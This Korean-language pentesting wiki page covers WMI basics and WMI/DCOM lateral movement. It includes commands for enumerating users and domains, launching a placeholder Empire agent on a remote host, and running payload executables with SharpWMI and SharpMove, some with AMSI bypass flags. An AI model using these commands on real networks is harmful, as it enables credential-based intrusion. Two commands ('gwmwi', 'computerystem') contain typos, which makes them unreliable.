# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## 작동 원리 설명

사용자 이름과 비밀번호 또는 해시를 알고 있는 경우 WMI를 사용하여 호스트에서 프로세스를 열 수 있습니다. Wmiexec는 WMI를 사용하여 명령을 실행하며, 반대화형 셸 환경을 제공합니다.

**dcomexec.py:** 이 스크립트는 다양한 DCOM 엔드포인트를 사용하여 `wmiexec.py`와 유사한 반대화형 셸을 제공합니다. 선택한 `-object` 값에 따라 엔드포인트가 결정됩니다. 지원되는 객체에는 `MMC20.Application`, `ShellWindows`, `ShellBrowserWindow`가 있으며, 이 중 마지막 객체는 원래 walkthrough에서 강조된 Shell Browser Window technique을 제공합니다.<sup>[[2]](#references)[[3]](#references)</sup>

## WMI 기본 사항

### 네임스페이스

디렉터리 스타일의 계층 구조로 구성된 WMI의 최상위 컨테이너는 \root이며, 그 아래에 네임스페이스라고 하는 추가 디렉터리가 구성됩니다.<sup>[[1]](#references)</sup>
네임스페이스를 나열하는 명령:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
namespace 내의 클래스는 다음과 같이 나열할 수 있습니다:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **클래스**

win32_process와 같은 WMI 클래스 이름과 해당 클래스가 존재하는 namespace를 아는 것은 모든 WMI 작업에 매우 중요합니다.  
`win32`로 시작하는 클래스를 나열하는 Commands:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
클래스 호출:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Methods

WMI 클래스의 하나 이상의 실행 가능한 함수인 Methods를 실행할 수 있습니다.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI 열거

### WMI 서비스 상태

WMI 서비스가 작동 중인지 확인하는 명령:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### 시스템 및 프로세스 정보

WMI를 통한 시스템 및 프로세스 정보 수집:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
공격자에게 WMI는 시스템이나 도메인에 관한 민감한 데이터를 열거하는 강력한 도구입니다.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
특정 정보(예: local admins 또는 로그인한 사용자)를 확인하기 위해 WMI를 원격으로 쿼리할 수 있으며, 명령을 신중하게 구성해야 합니다.

### **수동 원격 WMI 쿼리**

특정 WMI 쿼리를 사용하면 원격 시스템의 local admins와 로그인한 사용자를 은밀하게 식별할 수 있습니다. `wmic`는 텍스트 파일에서 읽어 여러 노드에 동시에 명령을 실행하는 기능도 지원합니다.<sup>[[1]](#references)</sup>

Empire agent 배포와 같이 WMI를 통해 원격으로 프로세스를 실행하려면 다음 명령 구조를 사용하며, 반환 값이 `"0"`이면 실행에 성공한 것입니다:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
이 프로세스는 WMI의 원격 실행 및 시스템 열거 기능을 보여 주며, 시스템 관리와 pentesting 모두에서의 유용성을 강조합니다.

## 자동화 도구

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- **Impacket의 `wmiexec`**를 사용할 수도 있습니다.


## References

- [1] [Credential을 사용하여 Windows Box 장악하기 - Part 3 (WMI 및 WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Impacket Tool Kit 초보자 가이드, Part 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
